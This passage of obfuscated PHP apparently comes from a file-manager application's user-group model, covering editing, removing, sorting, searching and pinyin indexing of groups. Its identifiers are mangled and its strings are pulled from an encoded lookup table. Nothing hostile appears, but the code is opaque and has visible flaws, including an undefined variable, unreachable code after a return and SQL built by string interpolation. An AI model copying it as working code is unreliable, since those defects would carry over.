$£–¨î”Ï[$šÉ¡‰ÍÁ[32]]); if (isset($ã¶ß¨º[$šÉ¡‰ÍÁ[2068]])) { $this->metaSet($‘‹‘–„ô, array($šÉ¡‰ÍÁ[2068] => $ã¶ß¨º[$šÉ¡‰ÍÁ[2068]], $šÉ¡‰ÍÁ[2069] => $ã¶ß¨º[$šÉ¡‰ÍÁ[2069]])); unset($ã¶ß¨º[$šÉ¡‰ÍÁ[2068]]); unset($ã¶ß¨º[$šÉ¡‰ÍÁ[2069]]); } Model($šÉ¡‰ÍÁ[1428])->groupRootAdd($‘‹‘–„ô); $this->_clearCache($ã¶ß¨º[$šÉ¡‰ÍÁ[192]]); return $‘‹‘–„ô; } protected function groupEdit($ô¬Å­Êë, $ˆ‰Şº¼Å) { $ÓîÎÇ½ä =& $_SERVER[§Êá¸İ]; $ûøÄ…à„ = $this->getInfoSimple($ô¬Å­Êë); if (!$ûøÄ…à„) { return !1; } if (!empty($ˆ‰Şº¼Å[$ÓîÎÇ½ä[192]])) { $·…ºì’§ = $this->getInfoSimple($ˆ‰Şº¼Å[$ÓîÎÇ½ä[192]]); if (!$·…ºì’§) { return !1; } if ($ûøÄ…à„[$ÓîÎÇ½ä[1978]] == $·…ºì’§[$ÓîÎÇ½ä[1978]]) { return !1; } if ($ˆ‰Şº¼Å[$ÓîÎÇ½ä[192]] != $ûøÄ…à„[$ÓîÎÇ½ä[192]]) { if ($·…ºì’§[$ÓîÎÇ½ä[592]] !== $ûøÄ…à„[$ÓîÎÇ½ä[592]] && strpos($·…ºì’§[$ÓîÎÇ½ä[592]], $ûøÄ…à„[$ÓîÎÇ½ä[592]] . $ûøÄ…à„[$ÓîÎÇ½ä[1978]] . $ÓîÎÇ½ä[50]) === 0) { return !1; } $ˆ‰Şº¼Å[$ÓîÎÇ½ä[660]] = $·…ºì’§[$ÓîÎÇ½ä[592]] . $ˆ‰Şº¼Å[$ÓîÎÇ½ä[192]] . $ÓîÎÇ½ä[50]; $this->_changeChildLevel($ûøÄ…à„, $·…ºì’§); $this->_clearCache($·…ºì’§[$ÓîÎÇ½ä[1978]]); $this->_clearCache($ûøÄ…à„[$ÓîÎÇ½ä[192]]); } } if (isset($ˆ‰Şº¼Å[$ÓîÎÇ½ä[32]])) { $this->setNamePinyin($ô¬Å­Êë, $ˆ‰Şº¼Å[$ÓîÎÇ½ä[32]]); } if (isset($ˆ‰Şº¼Å[$ÓîÎÇ½ä[2068]])) { $this->metaSet($ô¬Å­Êë, array($ÓîÎÇ½ä[2068] => $ˆ‰Şº¼Å[$ÓîÎÇ½ä[2068]], $ÓîÎÇ½ä[2069] => $ˆ‰Şº¼Å[$ÓîÎÇ½ä[2069]])); unset($ˆ‰Şº¼Å[$ÓîÎÇ½ä[2068]]); unset($ˆ‰Şº¼Å[$ÓîÎÇ½ä[2069]]); } $this->_clearChildrenCache($ûøÄ…à„); return $this->where(array($ÓîÎÇ½ä[2070] => $ô¬Å­Êë))->save($ˆ‰Şº¼Å); } private function _clearChildrenCache($Œ§Îˆ¡¿) { $ÏëƒãÁ =& $_SERVER[§Êá¸İ]; $¹ßßºîĞ = array($ÏëƒãÁ[660] => array($ÏëƒãÁ[620], $Œ§Îˆ¡¿[$ÏëƒãÁ[592]] . $Œ§Îˆ¡¿[$ÏëƒãÁ[1978]] . $ÏëƒãÁ[621])); $ÛÔğ”ä— = $this->field($ÏëƒãÁ[1978])->where($¹ßßºîĞ)->select(); foreach ($ÛÔğ”ä— as $Ğ›º®¤û) { $this->_clearCache($Ğ›º®¤û[$ÏëƒãÁ[1978]]); } } private function _clearCache($›Ò…µğ«) { $Ã›«âëŸ =& $_SERVER[§Êá¸İ]; $this->cacheFunctionClear($Ã›«âëŸ[2064], $›Ò…µğ«); $this->cacheFunctionClear($Ã›«âëŸ[2065], $›Ò…µğ«); } private function _changeChildLevel($ŸóÑÙ÷¢, $¡³ã×õ¤, $‰ôÙé•ï = false) { $ÆÇì°ôö =& $_SERVER[§Êá¸İ]; $Ì›§Î¯Â = $ŸóÑÙ÷¢[$ÆÇì°ôö[592]] . $ŸóÑÙ÷¢[$ÆÇì°ôö[1978]] . $ÆÇì°ôö[50]; $ÔœĞê½” = $¡³ã×õ¤[$ÆÇì°ôö[592]] . $¡³ã×õ¤[$ÆÇì°ôö[1978]] . $ÆÇì°ôö[50] . $ŸóÑÙ÷¢[$ÆÇì°ôö[1978]] . $ÆÇì°ôö[50]; if ($‰ôÙé•ï) { $ÔœĞê½” = $¡³ã×õ¤[$ÆÇì°ôö[592]] . $¡³ã×õ¤[$ÆÇì°ôö[1978]] . $ÆÇì°ôö[50]; } $ÏÑÛ÷…æ = array($ÆÇì°ôö[660] => array($ÆÇì°ôö[620], $ŸóÑÙ÷¢[$ÆÇì°ôö[592]] . $ŸóÑÙ÷¢[$ÆÇì°ôö[1978]] . $ÆÇì°ôö[621])); $³’¦ïâ = array($ÆÇì°ôö[660] => array($ÆÇì°ôö[669], "\x72\145\160\154\141\143\x65\x28\x70\x61\162\145\x6e\164\x4c\145\x76\145\x6c\54\x27{$Ì›§Î¯Â}\x27\x2c\x27{$ÔœĞê½”}\x27\51")); $this->_clearChildrenCache($ŸóÑÙ÷¢); $this->where($ÏÑÛ÷…æ)->data($³’¦ïâ)->save(); } public function setNamePinyin($®Éä óÄ, $ÓĞàÑÎ = false) { $ĞèëøúÛ =& $_SERVER[§Êá¸İ]; if (!$ÓĞàÑÎ) { $»¹ï¾ì„ = $this->getInfoSimple($®Éä óÄ); $ÓĞàÑÎ = $»¹ï¾ì„[$ĞèëøúÛ[32]]; } if (!Input::check($ÓĞàÑÎ, $ĞèëøúÛ[663])) { $this->metaSet($®Éä óÄ, $ĞèëøúÛ[546], null); $this->metaSet($®Éä óÄ, $ĞèëøúÛ[545], null); return; } $öÈ•¤Á = array($ĞèëøúÛ[546] => str_replace($ĞèëøúÛ[53], $ĞèëøúÛ[12], Pinyin::get($ÓĞàÑÎ)), $ĞèëøúÛ[545] => Pinyin::get($ÓĞàÑÎ, $ĞèëøúÛ[664])); $this->metaSet($®Éä óÄ, $öÈ•¤Á); } protected function groupStatus($ÂßŞ¶´¤, $ÅàÌ¹İğ) { $¦¼äß˜ò =& $_SERVER[§Êá¸İ]; $’«Ğ„  = $this->getInfoSimple($ÂßŞ¶´¤); if (!$’«Ğ„ ) { return !1; } $this->_clearCache($ÂßŞ¶´¤); return $this->metaSet($ÂßŞ¶´¤, $¦¼äß˜ò[837], $ÅàÌ¹İğ); if ($ÅàÌ¹İğ == $¦¼äß˜ò[91]) { $…ïï­° = $this->parentLevelArray($’«Ğ„ [$¦¼äß˜ò[592]]); } else { } $…ïï­°[] = $’«Ğ„ [$¦¼äß˜ò[1978]]; $‘‡«‡‘œ = array(); foreach ($…ïï­° as $ÂßŞ¶´¤) { $‘‡«‡‘œ[] = array($¦¼äß˜ò[1978] => $ÂßŞ¶´¤, $¦¼äß˜ò[97] => $¦¼äß˜ò[837], $¦¼äß˜ò[450] => $ÅàÌ¹İğ); $this->_clearCache($ÂßŞ¶´¤); } return Model($¦¼äß˜ò[2071])->addAll($‘‡«‡‘œ, array(), !0); } protected function groupRemove($ÍŠ²Ù«, $‡È’À´– = false) { $ÁÇ¶–Ú½ =& $_SERVER[§Êá¸İ]; $Ó¸‰Æ¦ = array($ÁÇ¶–Ú½[1978] => $ÍŠ²Ù«); $€Ô£š¬ = $this->where($Ó¸‰Æ¦)->find(); if (!$€Ô£š¬ || $€Ô£š¬[$ÁÇ¶–Ú½[192]] == 0) { return !1; } if (!$‡È’À´–) { $¨ÔòïÓŒ = $this->getInfoSimple($€Ô£š¬[$ÁÇ¶–Ú½[192]]); $this->_changeChildLevel($€Ô£š¬, $¨ÔòïÓŒ, !0); $this->where(array($ÁÇ¶–Ú½[192] => $ÍŠ²Ù«))->save(array($ÁÇ¶–Ú½[192] => $€Ô£š¬[$ÁÇ¶–Ú½[192]])); $this->_clearCache($¨ÔòïÓŒ[$ÁÇ¶–Ú½[1978]]); } Model($ÁÇ¶–Ú½[2071])->where($Ó¸‰Æ¦)->delete(); Model($ÁÇ¶–Ú½[2072])->where($Ó¸‰Æ¦)->delete(); Model($ÁÇ¶–Ú½[911])->groupRootRemove($ÍŠ²Ù«); $this->_clearCache($€Ô£š¬[$ÁÇ¶–Ú½[192]]); return $this->where($Ó¸‰Æ¦)->delete(); } protected function groupSort($Àá€›¦§) { $ü¥ø’¥ó =& $_SERVER[§Êá¸İ]; $ƒ¦äÅÆú = array(); foreach ($Àá€›¦§ as $Ê„Ã¾­È => $÷êä´é†) { $ƒ¦äÅÆú[] = array($ü¥ø’¥ó[1978], $÷êä´é†, $ü¥ø’¥ó[2002], $Ê„Ã¾­È + 1); } $this->saveAll($ƒ¦äÅÆú); } public function listData() { $–äÁƒ¢ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–äÁƒ¢[$_SERVER[§Êá¸İ][445]]); return $–äÁƒ¢; } private function _makeOrder($ì¾Šı˜ = '') { $³¥ó¨”‰ =& $_SERVER[§Êá¸İ]; $¸º÷¾Ñ = array($³¥ó¨”‰[1978], $³¥ó¨”‰[32], $³¥ó¨”‰[1966], $³¥ó¨”‰[231]); $É§©ÑåÖ = array($³¥ó¨”‰[531] => $³¥ó¨”‰[532], $³¥ó¨”‰[533] => $³¥ó¨”‰[534]); $÷ó¸Şœ÷ = Input::get($³¥ó¨”‰[538], $³¥ó¨”‰[7], $³¥ó¨”‰[1982], $¸º÷¾Ñ); $áÅ¹Ãîä = Input::get($³¥ó¨”‰[539], $³¥ó¨”‰[7], $³¥ó¨”‰[2073], array($³¥ó¨”‰[2073], $³¥ó¨”‰[533])); $áÅ¹Ãîä = $É§©ÑåÖ[$áÅ¹Ãîä]; $ì¾Šı˜ = $ì¾Šı˜ . "{$÷ó¸Şœ÷}\40{$áÅ¹Ãîä}\x2c\x20\x67\162\157\165\160\111\x44\40\x61\x73\x63"; return $this->order($ì¾Šı˜); } public function listChild($¿´×†é) { $‰†ïßÏ =& $_SERVER[§Êá¸İ]; $ã¥ìàÉæ = $this->where(array($‰†ïßÏ[192] => $¿´×†é))->_makeOrder()->selectPage(200); $this->_listDataApply($ã¥ìàÉæ[$‰†ïßÏ[445]]); return $ã¥ìàÉæ; } public function listChildIds($¥–÷šëÒ) { $’¢Â‰Óò =& $_SERVER[§Êá¸İ]; if (is_string($¥Ì¸®Ã£)) { $¥–÷šëÒ = explode($’¢Â‰Óò[50], $¥–÷šëÒ); } $˜Øâ¤õ© = $this->where(array($’¢Â‰Óò[1978] => array($’¢Â‰Óò[7], $¥–÷šëÒ)))->field($’¢Â‰Óò[2074])->select(); if (!$˜Øâ¤õ©) { return !1; } $§Åø²‡— = array(); foreach ($˜Øâ¤õ© as $Œ¦˜€ËĞ) { $§Åø²‡—[] = "\163\x65\154\x65\x63\164\40\147\162\157\x75\160\x49\x44\40\x66\x72\157\155\x20\x60\x67\162\x6f\x75\160\140\x20\167\x68\145\x72\145\40\160\141\162\x65\156\164\x4c\x65\x76\145\x6c\40\x6c\x69\x6b\145\x20\47{$Œ¦˜€ËĞ[$’¢Â‰Óò[592]]}{$Œ¦˜€ËĞ[$’¢Â‰Óò[1978]]}\x2c\45\x27"; } $§Åø²‡— = implode($’¢Â‰Óò[2075], $§Åø²‡—); $˜Øâ¤õ© = $this->query($§Åø²‡—); if (!$˜Øâ¤õ©) { return array(); } $¥–÷šëÒ = array_to_keyvalue($˜Øâ¤õ©, $’¢Â‰Óò[12], $’¢Â‰Óò[1978]); return array_unique($¥–÷šëÒ); } public function listByID($Ö»É¶¹…) { $ˆÛ¥°€â =& $_SERVER[§Êá¸İ]; if (!$Ö»É¶¹…) { return array(); } $Â¦ÁÕÌ = array($ˆÛ¥°€â[1978] => array($ˆÛ¥°€â[7], $Ö»É¶¹…)); $ñ™ºƒœé = $this->where($Â¦ÁÕÌ)->select(); $ñ™ºƒœé = array_sort_keep($ñ™ºƒœé, $ˆÛ¥°€â[1978], $Ö»É¶¹…); $this->_listDataApply($ñ™ºƒœé); return $ñ™ºƒœé; } public function listSearch($ú¤˜ê©Á) { $Ë ¬ƒõ« =& $_SERVER[§Êá¸İ]; $¶ºĞè½– = trim($ú¤˜ê©Á[$Ë ¬ƒõ«[2076]]); $ıÜÚÕ¹ = explode($Ë ¬ƒõ«[53], $¶ºĞè½–); if (!$¶ºĞè½– || count($ıÜÚÕ¹) == 1) { return $this->listSearchNow($ú¤˜ê©Á); } $èŞÒÚÂİ = array($Ë ¬ƒõ«[445] => array()); foreach ($ıÜÚÕ¹ as $åéÚ¥­Ç) { if (!trim($åéÚ¥­Ç)) { continue; } $ú¤˜ê©Á[$Ë ¬ƒõ«[2076]] = $åéÚ¥­Ç; $Ï£¾¥ = $this->listSearchNow($ú¤˜ê©Á); $èŞÒÚÂİ[$Ë ¬ƒõ«[445]] = array_merge($èŞÒÚÂİ[$Ë ¬ƒõ«[445]], $Ï£¾¥[$Ë ¬ƒõ«[445]]); } $èŞÒÚÂİ[$Ë ¬ƒõ«[445]] = array_unique_by_key($èŞÒÚÂİ[$Ë ¬ƒõ«[445]], $Ë ¬ƒõ«[1978]); $èŞÒÚÂİ[$Ë ¬ƒõ«[442]] = array($Ë ¬ƒõ«[443] => count($èŞÒÚÂİ[$Ë ¬ƒõ«[445]]), $Ë ¬ƒõ«[439] => 20, $Ë ¬ƒõ«[429] => 1, $Ë ¬ƒõ«[444] => 1); return $èŞÒÚÂİ; } public function listSearchNow($ÂØ‚¼º”) { $âÌ¦¾¥¥ =& $_SERVER[§Êá¸İ]; $Ÿæ‚¶† = trim($ÂØ‚¼º”[$âÌ¦¾¥¥[2076]]); $óÕ¢°¶ = isset($ÂØ‚¼º”[$âÌ¦¾¥¥[2077]]) ? $ÂØ‚¼º”[$âÌ¦¾¥¥[2077]] : !1; if (!trim($Ÿæ‚¶†)) { return !1; } $Ÿæ‚¶† = str_replace($âÌ¦¾¥¥[2078], $âÌ¦¾¥¥[2079], $Ÿæ‚¶†); $íİÈ‡ŒŸ = array($âÌ¦¾¥¥[1978] => array($âÌ¦¾¥¥[459], "{$Ÿæ‚¶†}\45"), $âÌ¦¾¥¥[32] => array($âÌ¦¾¥¥[459], "\x25{$Ÿæ‚¶†}\x25"), $âÌ¦¾¥¥[1088] => $âÌ¦¾¥¥[2080]); if ($óÕ¢°¶) { $œİ‡Ú÷ = $this->getInfoSimple($óÕ¢°¶); $˜±ÒØ³¥ = $œİ‡Ú÷[$âÌ¦¾¥¥[592]] . $óÕ¢°¶ . $âÌ¦¾¥¥[621]; $íİÈ‡ŒŸ = array($íİÈ‡ŒŸ, array($âÌ¦¾¥¥[592] => array($âÌ¦¾¥¥[459], $˜±ÒØ³¥))); } $íİÈ‡ŒŸ = $this->parseWhereLike($íİÈ‡ŒŸ); $Õ–È°µ½ = $this->_makeOrder()->where($íİÈ‡ŒŸ)->selectPage(20); $Õ–È°µ½ = $Õ–È°µ½ ? $Õ–È°µ½ : array($âÌ¦¾¥¥[445] => array(), $âÌ¦¾¥¥[442] => array()); if (!$Õ–È°µ½ || count($Õ–È°µ½[$âÌ¦¾¥¥[445]]) < 5 && Input::check($Ÿæ‚¶†, $âÌ¦¾¥¥[394])) { $ôİÖø = $this->groupChildrenAll($óÕ¢°¶); $óŞ–¥¼‰ = $this->_searchFromMeta($âÌ¦¾¥¥[545], $Ÿæ‚¶†, 10, $ôİÖø); $ÄçŒÊ†¤ = $this->_searchFromMeta($âÌ¦¾¥¥[546], $Ÿæ‚¶†, 10, $ôİÖø); $µ‹Ãîã¼ = array_merge($óŞ–¥¼‰, $ÄçŒÊ†¤, $Õ–È°µ½[$âÌ¦¾¥¥[445]]); $Õ–È°µ½[$âÌ¦¾¥¥[445]] = array_unique_by_key($µ‹Ãîã¼, $âÌ¦¾¥¥[1978]); $Õ–È°µ½[$âÌ¦¾¥¥[442]][$âÌ¦¾¥¥[443]] = count($Õ–È°µ½[$âÌ¦¾¥¥[445]]); $Õ–È°µ½[$âÌ¦¾¥¥[442]][$âÌ¦¾¥¥[444]] = ceil($Õ–È°µ½[$âÌ¦¾¥¥[442]][$âÌ¦¾¥¥[443]] / $Õ–È°µ½[$âÌ¦¾¥¥[442]][$âÌ¦¾¥¥[439]]); } $this->_listDataApply($Õ–È°µ½[$âÌ¦¾¥¥[445]]); return $Õ–È°µ½; } protected function groupChildrenAll($Å˜Ôï¨§) { $¿¦­õ÷¨ =& $_SERVER[§Êá¸İ]; if (!$Å˜Ôï¨§) { return !1; } if (!is_array($Å˜Ôï¨§)) { $Å˜Ôï¨§ = array($Å˜Ôï¨§); } $¯°éÇ¾ = $Å˜Ôï¨§; foreach ($Å˜Ôï¨§ as $©åô‰¾ş) { $ğ¡¼ïŸØ = $this->getInfoSimple($©åô‰¾ş); $ßäÊç£– = array($¿¦­õ÷¨[592] => array($¿¦­õ÷¨[459], $ğ¡¼ïŸØ[$¿¦­õ÷¨[592]] . $©åô‰¾ş . $¿¦­õ÷¨[621])); $ùÏ×²Õó = $this->field($¿¦­õ÷¨[1978])->where($ßäÊç£–)->select(); $¯°éÇ¾ = array_merge($¯°éÇ¾, array_to_keyvalue($ùÏ×²Õó, $¿¦­õ÷¨[12], $¿¦­õ÷¨[1978])); } return array_unique($¯°éÇ¾); } private function _searchFromMeta($öø¤µ, $İúà÷—Ú, $Ş¡›ç¶”, $¤İ¯°ñŞ) { $èè¦£ªÜ =& $_SERVER[§Êá¸İ]; $İúà÷—Ú = strtolower($İúà÷—Ú); $¶Ãï£éø = array($èè¦£ªÜ[97] => $öø¤µ, $èè¦£ªÜ[450] => array($èè¦£ªÜ[459], "\45{$İúà÷—Ú}\45")); $¶Ãï£éø = $this->parseWhereLike($¶Ãï£éø); if ($¤İ¯°ñŞ) { $¶Ãï£éø[$èè¦£ªÜ[1978]] = array($èè¦£ªÜ[7], $¤İ¯°ñŞ); } $ôìîªÆ = Model($èè¦£ªÜ[2081])->where($¶Ãï£éø)->limit($Ş¡›ç¶”)->select(); if (!$ôìîªÆ) { return array(); } $ôìîªÆ = array_to_keyvalue($ôìîªÆ, $èè¦£ªÜ[12], $èè¦£ªÜ[1978]); $è¤İ‘’© = $this->where(array($èè¦£ªÜ[2070] => array($èè¦£ªÜ[7], $ôìîªÆ)))->select(); if (!$è¤İ‘’©) { return array(); } return $è¤İ‘’©; } protected function _listDataApplyItem($õø¥Ğ‹À) { $–Ö˜Ç· = array($õø¥Ğ‹À); $this->_listDataApply($–Ö˜Ç·); return $–Ö˜Ç·[0]; } protected function _listDataApply(&$¼ï‚ˆ”ª) { $¼ä™ÎĞú =& $_SERVER[§Êá¸İ]; if (!$¼ï‚ˆ”ª) { return; } $şé–½á = array_to_keyvalue($¼ï‚ˆ”ª, $¼ä™ÎĞú[12], $¼ä™ÎĞú[1978]); $this->_listAppendChildren($¼ï‚ˆ”ª); $this->_listAppendChildrenMember($¼ï‚ˆ”ª); $this->_listAppendMeta($¼ï‚ˆ”ª, $şé–½á); $this->_listAppendParent($¼ï‚ˆ”ª); $this->_listAppendSourceRoot($¼ï‚ˆ”ª, $şé–½á); } private function _listAppendChildren(&$ëŞ°â‡) { $ÜŸÊíŸ÷ =& $_SERVER[§Êá¸İ]; $»úÍÎ¾Í = array_to_keyvalue($ëŞ°â‡, $ÜŸÊíŸ÷[12], $ÜŸÊíŸ÷[1978]); $ÖÚ²¼èõ = array($ÜŸÊíŸ÷[192] => array($ÜŸÊíŸ÷[7], $»úÍÎ¾Í)); $²ĞœŞÂÎ = array($ÜŸÊíŸ÷[192], $ÜŸÊíŸ÷[2082] => $ÜŸÊíŸ÷[573]); $Í°úËşÕ = $this->field($²ĞœŞÂÎ)->where($ÖÚ²¼èõ)->group($ÜŸÊíŸ÷[192])->select(); $…º¡÷¬ = array_to_keyvalue($Í°úËşÕ, $ÜŸÊíŸ÷[192], $ÜŸÊíŸ÷[573]); foreach ($ëŞ°â‡ as &$òƒÖ”†) { $ÁôéíˆÔ = $òƒÖ”†[$ÜŸÊíŸ÷[1978]]; $òƒÖ”†[$ÜŸÊíŸ÷[2083]] = isset($…º¡÷¬[$ÁôéíˆÔ]) ? intval($…º¡÷¬[$ÁôéíˆÔ]) : !1; } unset($òƒÖ”†); } private function _listAppendChildrenMember(&$Î¿²Ê‘¬) { $§›ìÉ°´ =& $_SERVER[§Êá¸İ]; $Éö˜Ø±Ï = array_to_keyvalue($Î¿²Ê‘¬, $§›ìÉ°´[12], $§›ìÉ°´[1978]); $Œ™Ğğä = array($§›ìÉ°´[1978] => array($§›ìÉ°´[7], $Éö˜Ø±Ï)); $—ĞÃ’­ï = array($§›ìÉ°´[1978], $§›ìÉ°´[2082] => $§›ìÉ°´[573]); $¡‘³™ëß = Model($§›ìÉ°´[2072])->field($—ĞÃ’­ï)->where($Œ™Ğğä)->group($§›ìÉ°´[1978])->select(); $ƒÛãÛ”Ï = array_to_keyvalue($¡‘³™ëß, $§›ìÉ°´[1978], $§›ìÉ°´[573]); foreach ($Î¿²Ê‘¬ as &$ü¸ı¡­Ï) { $²Å’Æ›Í = $ü¸ı¡­Ï[$§›ìÉ°´[1978]]; $ü¸ı¡­Ï[$§›ìÉ°´[2084]] = isset($ƒÛãÛ”Ï[$²Å’Æ›Í]) ? intval($ƒÛãÛ”Ï[$²Å’Æ›Í]) : !1; } unset($ü¸ı¡­Ï); } private function _listAppendMeta(&$æè€”¾…, $§ÃÌöú) { $ş¸­´ï× =& $_SERVER[§Êá¸İ]; $œíø®ı„ = array($ş¸­´ï×[1978] => array($ş¸­´ï×[7], $§ÃÌöú)); $À›¡´ªÖ = Model($ş¸­´ï×[2071])->where($œíø®ı„)->select(); $À›¡´ªÖ = array_to_keyvalue_group($À›¡´ªÖ, $ş¸­´ï×[1978]); foreach ($À›¡´ªÖ as &$äµù¿„”) { $äµù¿„” = array_to_keyvalue($äµù¿„”, $ş¸­´ï×[97], $ş¸­´ï×[450]); } unset($äµù¿„”); foreach ($æè€”¾… as &$Ú¶ö¼§‚) { $Ú¶ö¼§‚[$ş¸­´ï×[547]] = array(); if (isset($À›¡´ªÖ[$Ú¶ö¼§‚[$ş¸­´ï×[1978]]])) { $Ú¶ö¼§‚[$ş¸­´ï×[547]] = $À›¡´ªÖ[$Ú¶ö¼§‚[$ş¸­´ï×[1978]]]; } } unset($Ú¶ö¼§‚); } protected function parentLevelArray($Ñ–òæ„ñ) { $²‰í£Â =& $_SERVER[§Êá¸İ]; $Ñ–òæ„ñ = explode($²‰í£Â[50], trim($Ñ–òæ„ñ, $²‰í£Â[50])); $Ñ–òæ„ñ = array_remove_value($Ñ–òæ„ñ, $²‰í£Â[228]); return $Ñ–òæ„ñ; } protected function parentInGroup($—Ì¨§È¢, $ùÁã”ÊÔ) { $Üüéê¬œ =& $_SERVER[§Êá¸İ]; $»–Ô¹ƒ™ = $this->getInfoSimple($—Ì¨§È¢); if (!$»–Ô¹ƒ™) { return !0; } $ğóğ½£Ÿ = $this->parentLevelArray($»–Ô¹ƒ™[$Üüéê¬œ[592]]); $ğóğ½£Ÿ[] = $—Ì¨§È¢; foreach ($ğóğ½£Ÿ as $—Ì¨§È¢) { if (in_array($—Ì¨§È¢ . $Üüéê¬œ[12], $ùÁã”ÊÔ)) { return !0; } } return !1; } private function _listAppendParent(&$‚¿ÌÙ‘) { $ÇÉ„ùÒë =& $_SERVER[§Êá¸İ]; $ÚŸıŞñÀ = array(); foreach ($‚¿ÌÙ‘ as &$ éšÀøñ) { $ÚŸıŞñÀ[$ éšÀøñ[$ÇÉ„ùÒë[1978]]] = $ éšÀøñ[$ÇÉ„ùÒë[32]]; $„¸À¶æì = $this->parentLevelArray($ éšÀøñ[$ÇÉ„ùÒë[592]]); foreach ($„¸À¶æì as $Õ®µâğ—) { if (!isset($ÚŸıŞñÀ[$Õ®µâğ—])) { $ÚŸıŞñÀ[$Õ®µâğ—] = 0; } } } unset($ éšÀøñ); foreach ($ÚŸıŞñÀ as $˜ÛÄÄÆº => $šâ÷×òŠ) { if ($šâ÷×òŠ) { continue; } $Â˜í¾ßé = $this->getInfoSimple($˜ÛÄÄÆº); $ÚŸıŞñÀ[$˜ÛÄÄÆº] = $Â˜í¾ßé[$ÇÉ„ùÒë[32]]; } $½İïûõì = $GLOBALS[$ÇÉ„ùÒë[6]][$ÇÉ„ùÒë[92]][$ÇÉ„ùÒë[2085]]; if (KodUser::isRoot()) { $½İïûõì = !1; } foreach ($‚¿ÌÙ‘ as &$ éšÀøñ) { $„¸À¶æì = $this->parentLevelArray($ éšÀøñ[$ÇÉ„ùÒë[592]]); $ıÕ†÷çî = $ÇÉ„ùÒë[12]; foreach ($„¸À¶æì as $˜ÛÄÄÆº => $Õ®µâğ—) { if ($½İïûõì && $˜ÛÄÄÆº == 0) { continue; } $ıÕ†÷çî .= $ÚŸıŞñÀ[$Õ®µâğ—] . $ÇÉ„ùÒë[8]; } if ($„¸À¶æì) { $ıÕ†÷çî .= $ éšÀøñ[$ÇÉ„ùÒë[32]]; } $ éšÀøñ[$ÇÉ„ùÒë[597]] = str_replace($ÇÉ„ùÒë[600], $ÇÉ„ùÒë[8], $ıÕ†÷çî); } unset($ éšÀøñ); } private function _listAppendSourceRoot(&$Üè¹”‚, $ËàœŠÁ¼) { $¾¤¶ìÎ =& $_SERVER[§Êá¸İ]; $¹“’­ô¨ = Model($¾¤¶ìÎ[911])->listSourceRoot(SourceModel::TYPE_GROUP, $ËàœŠÁ¼); $¹“’­ô¨ = array_to_keyvalue($¹“’­ô¨, $¾¤¶ìÎ[577]); $¹“’­ô¨ = array_remove_key($¹“’­ô¨, $¾¤¶ìÎ[577]); foreach ($Üè¹”‚ as &$¬ÙÁ›Ö÷) { $¬ÙÁ›Ö÷[$¾¤¶ìÎ[90]] = $¹“’­ô¨[$¬ÙÁ›Ö÷[$¾¤¶ìÎ[1978]]] ? $¹“’­ô¨[$¬ÙÁ›Ö÷[$¾¤¶ìÎ[1978]]] : array(); } unset($¬ÙÁ›Ö÷); } protected function groupMerge($ñ™öÅô‚) { $ñ™öÅô‚ = array_values(array_unique($ñ™öÅô‚)); $¶áø¾ñ÷ = array(); for ($Šú‘§×½ = 0; $Šú‘§×½ < count($ñ™öÅô‚); $Šú‘§×½++) { $†÷ ŞÍŠ = !1; for ($¢ÜæãïÖ = 0; $¢ÜæãïÖ < count($ñ™öÅô‚); $¢ÜæãïÖ++) { if ($Šú‘§×½ == $¢ÜæãïÖ) { continue; } if ($this->isParentOf($ñ™öÅô‚[$¢ÜæãïÖ], $ñ™öÅô‚[$Šú‘§×½])) { $†÷ ŞÍŠ = !0; break; } } if (!$†÷ ŞÍŠ) { $¶áø¾ñ÷[] = $ñ™öÅô‚[$Šú‘§×½]; } } return $¶áø¾ñ÷; } protected function isParentOf($œ©œèáó, $ÉúÍïƒì) { $ÎßÂæÕ =& $_SERVER[§Êá¸İ]; if (!$œ©œèáó || !$ÉúÍïƒì || $œ©œèáó == $ÉúÍïƒì) { return !1; } $™ÖßÕ ë = $this->getInfoSimple($œ©œèáó); $ôû­È¢“ = $this->getInfoSimple($ÉúÍïƒì); $šï±Éê = $™ÖßÕ ë[$ÎßÂæÕ[592]] . $œ©œèáó . $ÎßÂæÕ[50]; if (substr($ôû­È¢“[$ÎßÂæÕ[592]], 0, strlen($šï±Éê)) == $šï±Éê) { return !0; } return !1; } public function groupShowRoot($Á¼ù¢, $Èñª¶éØ = false) { $úÌ­‹ˆä =& $_SERVER[§Êá¸İ]; $íÎÙÇ”ü = $this->getInfo($Á¼ù¢); if (!$íÎÙÇ”ü) { return array(); } $˜ï¯Œ„ç = $this->parentLevelArray($íÎÙÇ”ü[$úÌ­‹ˆä[592]]); $Û¿ğüäÄ = array($Á¼ù¢); if (count($˜ï¯Œ„ç) == 0) { return $Û¿ğüäÄ; } if ($Èñª¶éØ && count($˜ï¯Œ„ç) == 1) { return $Û¿ğüäÄ; } if (!$íÎÙÇ”ü[$úÌ­‹ˆä[547]] || !isset($íÎÙÇ”ü[$úÌ­‹ˆä[547]][$úÌ­‹ˆä[2068]]) || $íÎÙÇ”ü[$úÌ­‹ˆä[547]][$úÌ­‹ˆä[2068]] == $úÌ­‹ˆä[863]) { return $this->groupShowRoot($˜ï¯Œ„ç[count($˜ï¯Œ„ç) - 1], $Èñª¶éØ); } if ($íÎÙÇ”ü[$úÌ­‹ˆä[547]][$úÌ­‹ˆä[2068]] == $úÌ­‹ˆä[433]) { $ÄõŒà = explode($úÌ­‹ˆä[50], $íÎÙÇ”ü[$úÌ­‹ˆä[547]][$úÌ­‹ˆä[2069]]); if ($ÄõŒà) { $Û¿ğüäÄ = array_merge($Û¿ğüäÄ, $ÄõŒà); } } return $Û¿ğüäÄ; } protected function resetParentLevel() { $…´¨Åõ =& $_SERVER[§Êá¸İ]; $‚ú‡ô¢ = $…´¨Åõ[1978]; $Ñéé¼Ì = $this->select(); $Ñéé¼Ì = array_to_keyvalue($Ñéé¼Ì, $‚ú‡ô¢); foreach ($Ñéé¼Ì as $ÇóÊĞ’û) { $ÉÈÄç« = $ÇóÊĞ’û; $‡ƒÌœ¼¸ = array(); while ($ÉÈÄç«[$…´¨Åõ[192]] != 0) { $‡ƒÌœ¼¸[] = $ÉÈÄç«[$…´¨Åõ[192]]; $ÉÈÄç« = $Ñéé¼Ì[$ÉÈÄç«[$…´¨Åõ[192]]]; } $‡ƒÌœ¼¸[] = 0; $‡ƒÌœ¼¸ = $…´¨Åõ[50] . implode($…´¨Åõ[50], array_reverse($‡ƒÌœ¼¸)) . $…´¨Åõ[50]; $this->setNamePinyin($ÇóÊĞ’û[$‚ú‡ô¢], $ÇóÊĞ’û[$…´¨Åõ[32]]); 